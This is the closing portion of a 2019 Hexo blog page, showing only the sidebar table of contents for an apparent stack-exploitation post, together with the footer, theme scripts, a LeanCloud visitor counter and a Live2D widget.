class="nav-text">C.定位栈地址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）动态调试"><span class="nav-number">3.3.1.</span> <span class="nav-text">（1）动态调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）内存搜索"><span class="nav-number">3.3.2.</span> <span class="nav-text">（2）内存搜索</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#D-漏洞利用"><span class="nav-number">3.4.</span> <span class="nav-text">D.漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#E-备注"><span class="nav-number">3.5.</span> <span class="nav-text">E.备注</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ayesawyer</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>  访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("yWdQWaFa2z2MWDKsMNEzvv3E-gzGzoHsz", "e6INbOXP7UPpJUnKlgxhNb52");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nico.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
